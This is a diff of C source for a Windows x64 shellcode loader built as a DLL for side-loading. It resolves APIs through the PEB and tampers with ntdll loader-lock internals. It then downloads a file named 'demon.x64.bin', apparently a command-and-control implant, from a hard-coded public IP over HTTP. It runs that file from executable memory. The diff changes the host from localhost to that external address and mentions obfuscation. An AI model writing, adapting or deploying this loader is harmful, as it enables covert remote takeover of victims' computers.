@@ -1,3 +1,5 @@
+// Only Build for Windows x64 platform
+
 #include <windows.h>
 #include <winhttp.h>
 #ifndef __NTDLL_H__
@@ -6,7 +8,13 @@
   (out = (c1 <= 'Z' && c1 >= 'A') ? c1 = (c1 - 'A') + 'a' : c1)
 #endif
 
+#define LdrpInitCompleteEvent (HANDLE)0x4
+#define LdrpLoadCompleteEvent (HANDLE)0x3c
+#define LdrpWorkCompleteEvent (HANDLE)0x40
+
 int work();
+VOID modifyLdrEvents(BOOL doSet);
+PULONG64 getLdrpWorkInProgressAddress();
 typedef struct _UNICODE_STRING {
   USHORT Length;
   USHORT MaximumLength;
@@ -51,20 +59,19 @@ typedef struct _PEB {
 #endif  //__NTDLL_H__
 LPVOID get_module_by_name(WCHAR* module_name);
 LPVOID get_func_by_name(LPVOID module, char* func_name);
-PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len) ;
- VOID SlowFillMemory(LPVOID pvDest, SIZE_T cbBuffer,
-                                     BYTE bFill) ;
+PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len);
+VOID SlowFillMemory(LPVOID pvDest, SIZE_T cbBuffer, BYTE bFill);
 
 typedef HMODULE(WINAPI* LoadLibraryWFunction)(LPWSTR lpLibFileName);
 typedef HINTERNET(WINAPI* WinHttpOpenFunction)(LPCWSTR pszAgentW,
-                                                DWORD dwAccessType,
-                                                LPCWSTR pszProxyW,
-                                                LPCWSTR pszProxyBypassW,
-                                                DWORD dwFlags);
+                                               DWORD dwAccessType,
+                                               LPCWSTR pszProxyW,
+                                               LPCWSTR pszProxyBypassW,
+                                               DWORD dwFlags);
 typedef HINTERNET(WINAPI* WinHttpConnectFunction)(HINTERNET hSession,
-                                          LPCWSTR pswzServerName,
-                                          INTERNET_PORT nServerPort,
-                                          DWORD dwReserved);
+                                                  LPCWSTR pswzServerName,
+                                                  INTERNET_PORT nServerPort,
+                                                  DWORD dwReserved);
 typedef HINTERNET(WINAPI* WinHttpOpenRequestFunction)(
     HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName,
     LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR* ppwszAcceptTypes,
@@ -81,154 +88,181 @@ typedef LPVOID(WINAPI* VirtualAllocFunction)(LPVOID lpAddress, SIZE_T dwSize,
                                              DWORD flProtect);
 typedef BOOL(WINAPI* WinHttpQueryDataAvailableFunction)(
     HINTERNET hRequest, LPDWORD lpdwNumberOfBytesAvailable);
-typedef BOOL(WINAPI* WinHttpReadDataFunction)(HINTERNET hRequest, LPVOID lpBuffer,
-                                      DWORD dwNumberOfBytesToRead,
-                                      LPDWORD lpdwNumberOfBytesRead);
+typedef BOOL(WINAPI* WinHttpReadDataFunction)(HINTERNET hRequest,
+                                              LPVOID lpBuffer,
+                                              DWORD dwNumberOfBytesToRead,
+                                              LPDWORD lpdwNumberOfBytesRead);
 typedef BOOL(WINAPI* WinHttpCloseHandleFunction)(HINTERNET hInternet);
 
-typedef NTSTATUS
-(WINAPI* RtlLeaveCriticalSection)(
-    IN PRTL_CRITICAL_SECTION CriticalSection
-    );
+typedef NTSTATUS(WINAPI* RtlLeaveCriticalSection)(
+    IN PRTL_CRITICAL_SECTION CriticalSection);
 
+typedef HANDLE(WINAPI* CreateThreadFunction)(
+    LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize,
+    LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter,
+    DWORD dwCreationFlags, LPDWORD lpThreadId);
 
-const WCHAR kernel32string[] __attribute__((section(".text"))) = L"kernel32.dll";
+typedef DWORD(WINAPI* WaitForSingleObjectFunction)(HANDLE hHandle,
+                                                   DWORD dwMilliseconds);
+
+typedef BOOL(WINAPI* ResetEventFunction)(HANDLE hEvent);
+
+typedef BOOL (*WINAPI SetEventFunction)(HANDLE hEvent);
+
+const WCHAR kernel32string[] __attribute__((section(".text"))) =
+    L"kernel32.dll";
 const WCHAR ntdllstring[] __attribute__((section(".text"))) = L"ntdll.dll";
-const char WinHttpOpenstring[] __attribute__((section(".text"))) = "WinHttpOpen";
-const char WinHttpConnectstring[] __attribute__((section(".text"))) = "WinHttpConnect";
-const char WinHttpOpenRequeststring[] __attribute__((section(".text"))) = "WinHttpOpenRequest";
-const char WinHttpSendRequeststring[] __attribute__((section(".text"))) = "WinHttpSendRequest";
-const char WinHttpReceiveResponsestring[] __attribute__((section(".text"))) = "WinHttpReceiveResponse";
-const char VirtualAllocstring[] __attribute__((section(".text"))) = "VirtualAlloc";
-const char WinHttpQueryDataAvailablestring[] __attribute__((section(".text"))) = "WinHttpQueryDataAvailable";
-const char WinHttpReadDatastring[] __attribute__((section(".text"))) = "WinHttpReadData";
-const char WinHttpCloseHandlestring[] __attribute__((section(".text"))) = "WinHttpCloseHandle";
+const char WinHttpOpenstring[] __attribute__((section(".text"))) =
+    "WinHttpOpen";
+const char WinHttpConnectstring[] __attribute__((section(".text"))) =
+    "WinHttpConnect";
+const char WinHttpOpenRequeststring[] __attribute__((section(".text"))) =
+    "WinHttpOpenRequest";
+const char WinHttpSendRequeststring[] __attribute__((section(".text"))) =
+    "WinHttpSendRequest";
+const char WinHttpReceiveResponsestring[] __attribute__((section(".text"))) =
+    "WinHttpReceiveResponse";
+const char VirtualAllocstring[] __attribute__((section(".text"))) =
+    "VirtualAlloc";
+const char WinHttpQueryDataAvailablestring[] __attribute__((section(".text"))) =
+    "WinHttpQueryDataAvailable";
+const char WinHttpReadDatastring[] __attribute__((section(".text"))) =
+    "WinHttpReadData";
+const char WinHttpCloseHandlestring[] __attribute__((section(".text"))) =
+    "WinHttpCloseHandle";
 const WCHAR Winhttpstring[] __attribute__((section(".text"))) = L"Winhttp.dll";
-const char LoadLibraryWstring[] __attribute__((section(".text"))) = "LoadLibraryW";
-const char RtlLeaveCriticalSectionstring[] __attribute__((section(".text"))) = "RtlLeaveCriticalSection";
+const char LoadLibraryWstring[] __attribute__((section(".text"))) =
+    "LoadLibraryW";
+const char RtlLeaveCriticalSectionstring[] __attribute__((section(".text"))) =
+    "RtlLeaveCriticalSection";
+const char RtlExitUserProcessstring[] __attribute__((section(".text"))) =
+    "RtlExitUserProcess";
+const char CreateThreadstring[] __attribute__((section(".text"))) =
+    "CreateThread";
+const char WaitForSingleObjectstring[] __attribute__((section(".text"))) =
+    "WaitForSingleObject";
+
+const char SetEventstring[] __attribute__((section(".text"))) = "SetEvent";
+const char ResetEventstring[] __attribute__((section(".text"))) = "ResetEvent";
 
 const WCHAR method[] __attribute__((section(".text"))) = L"GET";
 const WCHAR agent[] __attribute__((section(".text"))) = L"TODO";
 
-
-const WCHAR target_ip[] __attribute__((section(".text"))) = L"127.0.0.1";
+const WCHAR target_ip[] __attribute__((section(".text"))) = L"124.220.235.28";
 const WCHAR target_file[] __attribute__((section(".text"))) = L"demon.x64.bin";
 const int target_port __attribute__((section(".text"))) = 80;
 
-int again = 0;
+BOOL WINAPI DllMain(HINSTANCE hinstDLL,  // handle to DLL module
+                    DWORD fdwReason,     // reason for calling function
+                    LPVOID lpvReserved)  // reserved
+{
+  // DisableThreadLibraryCalls(hinstDLL);
+  // if (fdwReason == DLL_PROCESS_ATTACH) {
+  char* peb = NULL;
+  peb = (char*)__readgsqword(0x60);
 
-void ___chkstk_ms(); // ollvmµÄÐé¼Ù¿ØÖÆÁ÷ÐèÒªÁ´½ÓÕâ¸öº¯Êý
+  void* ntdll_base = get_module_by_name(ntdllstring);
+  void* kr32_base = get_module_by_name(kernel32string);
+  RtlLeaveCriticalSection _RtlLeaveCriticalSection =
+      get_func_by_name(ntdll_base, RtlLeaveCriticalSectionstring);
+  if (!_RtlLeaveCriticalSection) {
+    return 19;
+  }
+  PRTL_CRITICAL_SECTION s = *(PRTL_CRITICAL_SECTION*)(peb + 0x110);
+
+  // win10 or later
+  // If you want DLL Side Loading , Dont Define SHELLCODE , Otherwise it will be
+  // deadlocked (ntdll!LdrpLoaderLock)
+#ifndef SHELLCODE
+  _RtlLeaveCriticalSection(s);
+  modifyLdrEvents(TRUE);
+
+  const PULONG64 LdrpWorkInProgress = getLdrpWorkInProgressAddress();
+  InterlockedDecrement64(LdrpWorkInProgress);
+  //
+#endif
+  DWORD idthread;
+  CreateThreadFunction _CreateThread =
+      get_func_by_name(kr32_base, CreateThreadstring);
+  WaitForSingleObjectFunction _WaitForSingleObject =
+      get_func_by_name(kr32_base, WaitForSingleObjectstring);
+  HANDLE hThread = _CreateThread(0, 0, work, 0, 0, &idthread);
+  _WaitForSingleObject(hThread, INFINITE);
+  return 0x11223344;  // Success
+  //}
+}
+
+void ___chkstk_ms();  // ollvmçš„è™šå‡æŽ§åˆ¶æµéœ€è¦é“¾æŽ¥è¿™ä¸ªå‡½æ•°
 int work() {
-      #ifdef DEBUG
-      printf("enter work \n");
-    #endif
   void* kr32_base = get_module_by_name(kernel32string);
   void* ntdll_base = get_module_by_name(ntdllstring);
   if (!kr32_base) {
-    #ifdef DEBUG
-      printf("cant find kr32_base\n");
-    #endif
     return 1;
   }
   LoadLibraryWFunction _LoadLibraryW =
       (LoadLibraryWFunction)get_func_by_name(kr32_base, LoadLibraryWstring);
-  if(!_LoadLibraryW){
-        #ifdef DEBUG
-      printf("cant find _LoadLibraryW\n");
-    #endif
+  if (!_LoadLibraryW) {
     return 2;
   }
   void* winhttp_base = _LoadLibraryW(Winhttpstring);
-  if(!winhttp_base){
-            #ifdef DEBUG
-      printf("cant find winhttp_base\n");
-    #endif
+  if (!winhttp_base) {
     return 3;
   }
   WinHttpOpenFunction _WinHttpOpen =
       get_func_by_name(winhttp_base, WinHttpOpenstring);
-      if (!_WinHttpOpen){
-            #ifdef DEBUG
-      printf("cant find _WinHttpOpen\n");
-    #endif
-        return 4;
-      }
+  if (!_WinHttpOpen) {
+    return 4;
+  }
 
   WinHttpConnectFunction _WinHttpConnect =
       get_func_by_name(winhttp_base, WinHttpConnectstring);
 
-      if(!_WinHttpConnect){
-                    #ifdef DEBUG
-      printf("cant find _WinHttpConnect\n");
-    #endif
-        return 5;
-      }
+  if (!_WinHttpConnect) {
+    return 5;
+  }
   WinHttpOpenRequestFunction _WinHttpOpenRequest =
       get_func_by_name(winhttp_base, WinHttpOpenRequeststring);
 
-if(!_WinHttpOpenRequest){
-                      #ifdef DEBUG
-      printf("cant find _WinHttpOpenRequest\n");
-    #endif
-  return 6;
-}
+  if (!_WinHttpOpenRequest) {
+    return 6;
+  }
 
   WinHttpSendRequestFunction _WinHttpSendRequest =
       get_func_by_name(winhttp_base, WinHttpSendRequeststring);
-if(!_WinHttpSendRequest){
-                        #ifdef DEBUG
-      printf("cant find _WinHttpSendRequest\n");
-    #endif
-  return 7;
-}
+  if (!_WinHttpSendRequest) {
+    return 7;
+  }
 
   WinHttpReceiveResponseFunction _WinHttpReceiveResponse =
       get_func_by_name(winhttp_base, WinHttpReceiveResponsestring);
-  if (!_WinHttpReceiveResponse){
-                            #ifdef DEBUG
-      printf("cant find _WinHttpReceiveResponse\n");
-    #endif
+  if (!_WinHttpReceiveResponse) {
     return 8;
   }
-
 
   VirtualAllocFunction _VirtualAlloc =
       get_func_by_name(kr32_base, VirtualAllocstring);
 
-if(!_VirtualAlloc){
-                       #ifdef DEBUG
-      printf("cant find _VirtualAlloc\n");
-    #endif
-  return 9;
-}
+  if (!_VirtualAlloc) {
+    return 9;
+  }
   WinHttpQueryDataAvailableFunction _WinHttpQueryDataAvailable =
       get_func_by_name(winhttp_base, WinHttpQueryDataAvailablestring);
 
-if(!_WinHttpQueryDataAvailable){
-                         #ifdef DEBUG
-      printf("cant find _WinHttpQueryDataAvailable\n");
-    #endif
-  return 10;
-}
+  if (!_WinHttpQueryDataAvailable) {
+    return 10;
+  }
   WinHttpReadDataFunction _WinHttpReadData =
       get_func_by_name(winhttp_base, WinHttpReadDatastring);
 
-if(!_WinHttpReadData){
-                           #ifdef DEBUG
-      printf("cant find _WinHttpReadData\n");
-    #endif
-return 11;
-}
+  if (!_WinHttpReadData) {
+    return 11;
+  }
   WinHttpCloseHandleFunction _WinHttpCloseHandle =
       get_func_by_name(winhttp_base, WinHttpCloseHandlestring);
 
-if (!_WinHttpCloseHandle){
-                          #ifdef DEBUG
-      printf("cant find _WinHttpCloseHandle\n");
-    #endif
-  return 12;
-
-}
+  if (!_WinHttpCloseHandle) {
+    return 12;
+  }
 
   // https://github.com/huaigu4ng/SysWhispers3WinHttp/blob/main/SysWhispers3WinHttp.c
   DWORD dwSize = 0;
@@ -237,71 +271,54 @@ if (!_WinHttpCloseHandle){
   BOOL bResults = FALSE;
   HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
 
-  hSession =
-      _WinHttpOpen(agent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-                   WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+  hSession = _WinHttpOpen(agent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                          WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
 
-  // payloadËùÔÚµÄ·þÎñÆ÷, ip ºÍ ¶Ë¿Ú
-  if (hSession) hConnect = _WinHttpConnect(hSession, target_ip, target_port, 0);
+  // payloadæ‰€åœ¨çš„æœåŠ¡å™¨, ip å’Œ ç«¯å£
+  if (hSession)
+    hConnect = _WinHttpConnect(hSession, target_ip, target_port, 0);
   else {
-                        #ifdef DEBUG
-      printf("_WinHttpConnect FAIL\n");
-    #endif
     return 15;
   }
 
-  if (hConnect)// payloadÎÄ¼þÃû
-    hRequest = _WinHttpOpenRequest(hConnect, method, target_file,
-                                   NULL, WINHTTP_NO_REFERER,
+  if (hConnect)  // payloadæ–‡ä»¶å
+    hRequest = _WinHttpOpenRequest(hConnect, method, target_file, NULL,
+                                   WINHTTP_NO_REFERER,
                                    WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
-  else{
-                  #ifdef DEBUG
-      printf("_WinHttpOpenRequest FAIL\n");
-    #endif
+  else {
     return 16;
   }
 
   if (hRequest)
     bResults = _WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                    WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
-        else {
-
-                            #ifdef DEBUG
-      printf("_WinHttpSendRequest FAIL\n");
-    #endif
+  else {
     return 17;
-        }
+  }
 
-  if (bResults) bResults = _WinHttpReceiveResponse(hRequest, NULL);
-  else{
-                         #ifdef DEBUG
-      printf("_WinHttpReceiveResponse FAIL ,Last Error %d\n",GetLastError());
-    #endif
+  if (bResults)
+    bResults = _WinHttpReceiveResponse(hRequest, NULL);
+  else {
     return 13;
   }
 
   PVOID lpAddress = NULL;
-  SIZE_T sDataSize = 0x1000 * 10000;  // 1000K
+  SIZE_T sDataSize = 0x1000 * 10000;  // less than 10M
   lpAddress = _VirtualAlloc(0, sDataSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-  if (!lpAddress){
-    #ifdef DEBUG
-      printf("cant alloc memory\n");
-    #endif
+  if (!lpAddress) {
   }
   DWORD_PTR hptr = (DWORD_PTR)lpAddress;
 
   if (bResults) do {
       dwSize = 0;
       _WinHttpQueryDataAvailable(hRequest, &dwSize);
-      printf("dwSize %d \n",dwSize);
       pszOutBuffer =
           _VirtualAlloc(0, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-      if (!pszOutBuffer){
-        printf("pszOutBuffer %d \n",pszOutBuffer);
+      if (!pszOutBuffer) {
         break;
       }
       if (dwSize) {
-        //SlowFillMemory(pszOutBuffer, dwSize + 1, 0);
+        // SlowFillMemory(pszOutBuffer, dwSize + 1, 0);
         SlowFillMemory(pszOutBuffer, dwSize, 0);
       }
       _WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded);
@@ -313,10 +330,6 @@ if (!_WinHttpCloseHandle){
   if (hConnect) _WinHttpCloseHandle(hConnect);
   if (hSession) _WinHttpCloseHandle(hSession);
   void (*t)(void) = lpAddress;
-   #ifdef DEBUG
-      char * dump = lpAddress;
-      printf("%x %x %x \n",dump[0],dump[1],dump[2]);
-    #endif
   t();
 
   return 0;
@@ -362,7 +375,7 @@ LPVOID get_func_by_name(LPVOID module, char* func_name) {
   IMAGE_NT_HEADERS* nt_headers =
       (IMAGE_NT_HEADERS*)((BYTE*)module + idh->e_lfanew);
   IMAGE_DATA_DIRECTORY* exportsDir =
-      &(nt_headers ->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
+      &(nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
   if (exportsDir->VirtualAddress == NULL) {
     return NULL;
   }
@@ -406,8 +419,7 @@ PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len) {
   }
   return dest;
 }
- VOID SlowFillMemory(LPVOID pvDest, SIZE_T cbBuffer,
-                                     BYTE bFill) {
+VOID SlowFillMemory(LPVOID pvDest, SIZE_T cbBuffer, BYTE bFill) {
   PSIZE_T pdwBuffer;
   LPBYTE pbBuffer;
   SIZE_T dwFill;
@@ -433,140 +445,85 @@ PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len) {
   }
 }
 
-void ___chkstk_ms(){
-  return;
-}
-
-#define LdrpInitCompleteEvent (HANDLE)0x4
-#define LdrpLoadCompleteEvent (HANDLE)0x3c
-#define LdrpWorkCompleteEvent (HANDLE)0x40
+void ___chkstk_ms() { return; }
 PULONG64 getLdrpWorkInProgressAddress() {
-    // Find and return address of ntdll!LdrpWorkInProgres
-void* ntdll_base = get_module_by_name(ntdllstring);
-      void* _RtlExitUserProcess = get_func_by_name(ntdll_base,"RtlExitUserProcess");
-    PBYTE rtlExitUserProcessAddressSearchCounter = _RtlExitUserProcess;
+  // Find and return address of ntdll!LdrpWorkInProgres
+  void* ntdll_base = get_module_by_name(ntdllstring);
+  void* _RtlExitUserProcess =
+      get_func_by_name(ntdll_base, RtlExitUserProcessstring);
+  PBYTE rtlExitUserProcessAddressSearchCounter = _RtlExitUserProcess;
 
-    // call 0x41424344 (absolute for 32-bit program; relative for 64-bit program)
-    const BYTE callAddressOpcode = 0xe8;
-    const BYTE callAddressInstructionSize = sizeof(callAddressOpcode) + sizeof(INT32);
+  // call 0x41424344 (absolute for 32-bit program; relative for 64-bit program)
+  const BYTE callAddressOpcode = 0xe8;
+  const BYTE callAddressInstructionSize =
+      sizeof(callAddressOpcode) + sizeof(INT32);
 
-    // Search for this pattern:
-    // 00007ffc`949ed9a3 e84c0f0000           call    ntdll!LdrpDrainWorkQueue(7ffc949ee8f4)
-    // 00007ffc`949ed9a8 e8070dfeff           call    ntdll!LdrpAcquireLoaderLock(7ffc949ce6b4)
-    while (TRUE) {
-        if (*rtlExitUserProcessAddressSearchCounter == callAddressOpcode) {
-            // If there is another call opcode directly below this one
-            if (*(rtlExitUserProcessAddressSearchCounter + callAddressInstructionSize) == callAddressOpcode)
-                break;
-        }
-
-        rtlExitUserProcessAddressSearchCounter++;
+  // Search for this pattern:
+  // 00007ffc`949ed9a3 e84c0f0000           call
+  // ntdll!LdrpDrainWorkQueue(7ffc949ee8f4) 00007ffc`949ed9a8 e8070dfeff call
+  // ntdll!LdrpAcquireLoaderLock(7ffc949ce6b4)
+  while (TRUE) {
+    if (*rtlExitUserProcessAddressSearchCounter == callAddressOpcode) {
+      // If there is another call opcode directly below this one
+      if (*(rtlExitUserProcessAddressSearchCounter +
+            callAddressInstructionSize) == callAddressOpcode)
+        break;
     }
 
-    INT32 rel32EncodedAddress = *(PINT32)(rtlExitUserProcessAddressSearchCounter + sizeof(callAddressOpcode));
-    PBYTE ldrpDrainWorkQueue = (PBYTE)(rtlExitUserProcessAddressSearchCounter + callAddressInstructionSize + rel32EncodedAddress);
-    PBYTE ldrpDrainWorkQueueAddressSearchCounter = ldrpDrainWorkQueue;
+    rtlExitUserProcessAddressSearchCounter++;
+  }
 
-    // mov dword ptr [0x41424344], 0x1
-    // Swapped from 0xc705 to be in little endian
-    const USHORT movDwordAddressValueOpcode = 0x05c7;
-    const BYTE movDwordAddressValueInstructionSize = sizeof(movDwordAddressValueOpcode) + sizeof(INT32) + sizeof(INT32);
+  INT32 rel32EncodedAddress = *(PINT32)(rtlExitUserProcessAddressSearchCounter +
+                                        sizeof(callAddressOpcode));
+  PBYTE ldrpDrainWorkQueue =
+      (PBYTE)(rtlExitUserProcessAddressSearchCounter +
+              callAddressInstructionSize + rel32EncodedAddress);
+  PBYTE ldrpDrainWorkQueueAddressSearchCounter = ldrpDrainWorkQueue;
 
-    // Search for this pattern:
-    // 00007ffc`949ee97f c7055fca100001000000 mov     dword ptr [ntdll!LdrpWorkInProgress (7ffc94afb3e8)], 1
-    while (TRUE) {
-        if (*(PUSHORT)ldrpDrainWorkQueueAddressSearchCounter == movDwordAddressValueOpcode) {
-            // If TRUE (1) is being moved into this address
-            if (*(PBOOL)(ldrpDrainWorkQueueAddressSearchCounter + movDwordAddressValueInstructionSize - sizeof(INT32)) == TRUE)
-                break;
-        }
+  // mov dword ptr [0x41424344], 0x1
+  // Swapped from 0xc705 to be in little endian
+  const USHORT movDwordAddressValueOpcode = 0x05c7;
+  const BYTE movDwordAddressValueInstructionSize =
+      sizeof(movDwordAddressValueOpcode) + sizeof(INT32) + sizeof(INT32);
 
-        ldrpDrainWorkQueueAddressSearchCounter++;
+  // Search for this pattern:
+  // 00007ffc`949ee97f c7055fca100001000000 mov     dword ptr
+  // [ntdll!LdrpWorkInProgress (7ffc94afb3e8)], 1
+  while (TRUE) {
+    if (*(PUSHORT)ldrpDrainWorkQueueAddressSearchCounter ==
+        movDwordAddressValueOpcode) {
+      // If TRUE (1) is being moved into this address
+      if (*(PBOOL)(ldrpDrainWorkQueueAddressSearchCounter +
+                   movDwordAddressValueInstructionSize - sizeof(INT32)) == TRUE)
+        break;
     }
 
-    // Get pointer to ntdll!LdrpWorkInProgress boolean in the .DATA section of NTDLL
-    rel32EncodedAddress = *(PINT32)(ldrpDrainWorkQueueAddressSearchCounter + sizeof(movDwordAddressValueOpcode));
-    PULONG64 LdrpWorkInProgress = (PULONG64)(ldrpDrainWorkQueueAddressSearchCounter + movDwordAddressValueInstructionSize + rel32EncodedAddress);
+    ldrpDrainWorkQueueAddressSearchCounter++;
+  }
 
-    return LdrpWorkInProgress;
+  // Get pointer to ntdll!LdrpWorkInProgress boolean in the .DATA section of
+  // NTDLL
+  rel32EncodedAddress = *(PINT32)(ldrpDrainWorkQueueAddressSearchCounter +
+                                  sizeof(movDwordAddressValueOpcode));
+  PULONG64 LdrpWorkInProgress =
+      (PULONG64)(ldrpDrainWorkQueueAddressSearchCounter +
+                 movDwordAddressValueInstructionSize + rel32EncodedAddress);
+
+  return LdrpWorkInProgress;
 }
-VOID modifyLdrEvents(BOOL doSet, const HANDLE events[], const SIZE_T eventsSize) {
-    // Set event handles used by Windows loader (they are always these handle IDs)
-    // This is so we don't hang on WaitForSingleObject in the new thread (launched by ShellExecute) when it's loading more libraries
-    // Check the state of these event handles in WinDbg with this command: !handle 0 8 Event
+VOID modifyLdrEvents(BOOL doSet) {
+  // Set event handles used by Windows loader (they are always these handle IDs)
+  // This is so we don't hang on WaitForSingleObject in the new thread (launched
+  // by ShellExecute) when it's loading more libraries Check the state of these
+  // event handles in WinDbg with this command: !handle 0 8 Event
 
-    // Signal and unsignal in reverse order to avoid ordering inversion issues
-    if (!doSet) {
-        for (SIZE_T i = 0; i < eventsSize; ++i)
-            ResetEvent(events[i]);
-    }
-    else {
-        for (SIZE_T i = eventsSize; i-- > 0;)
-            SetEvent(events[i]);
-    }
-}
+  // Signal and unsignal in reverse order to avoid ordering inversion issues
 
-BOOL WINAPI DllMain(
-    HINSTANCE hinstDLL,  // handle to DLL module
-    DWORD fdwReason,     // reason for calling function
-    LPVOID lpvReserved )  // reserved
-{
-  DisableThreadLibraryCalls(hinstDLL);
-  if (fdwReason == DLL_PROCESS_ATTACH){
-    if(again > 0)
-      return 1;
-    
-    again++;
+  void* kr32_base = get_module_by_name(kernel32string);
+  SetEventFunction _SetEvent = get_func_by_name(kr32_base, SetEventstring);
 
-    char* peb = NULL;
-    peb = (char*)__readgsqword(0x60);
-    #ifdef DEBUG
-    printf("Peb address %p\n",peb);
-    #endif
-      void* ntdll_base = get_module_by_name(ntdllstring);
-      RtlLeaveCriticalSection _RtlLeaveCriticalSection = get_func_by_name(ntdll_base,RtlLeaveCriticalSectionstring);
-if(!_RtlLeaveCriticalSection){
-                          #ifdef DEBUG
-      printf("cant find _RtlLeaveCriticalSection\n");
-    #endif
-  return 19;
-}
-  PRTL_CRITICAL_SECTION s = *(PRTL_CRITICAL_SECTION*)(peb+0x110);
-      #ifdef DEBUG
-      printf("LockCount %d RecursionCount %d OwningThread %d LockSemaphore %d SpinCount %d\n",
-      s->LockCount,s->RecursionCount,s->OwningThread,s->LockSemaphore,s->SpinCount
-      );
-    #endif
-    //s->LockCount+=1;
-    _RtlLeaveCriticalSection(s);
-          #ifdef DEBUG
-      printf("LockCount %d RecursionCount %d OwningThread %d LockSemaphore %d SpinCount %d\n",
-      s->LockCount,s->RecursionCount,s->OwningThread,s->LockSemaphore,s->SpinCount
-      );
-    #endif
-// win10 or later
-    const HANDLE events[] = { LdrpInitCompleteEvent, LdrpWorkCompleteEvent };
-    const SIZE_T eventsCount = sizeof(events) / sizeof(events[0]);
-
-
-modifyLdrEvents(TRUE, events, eventsCount);
-
-
-const PULONG64 LdrpWorkInProgress = getLdrpWorkInProgressAddress();
-InterlockedDecrement64(LdrpWorkInProgress);
-//
-
-
-
-
-
-
-    DWORD idthread;
-    HANDLE hThread = CreateThread(0,0,work,0,0,&idthread);
-              #ifdef DEBUG
-              printf("thread id %x\n",idthread);
-                  #endif
-    WaitForSingleObject( hThread, INFINITE );
-  return 1;
-}
+  if (doSet) {
+    _SetEvent(LdrpInitCompleteEvent);
+    _SetEvent(LdrpWorkCompleteEvent);
+  }
 }
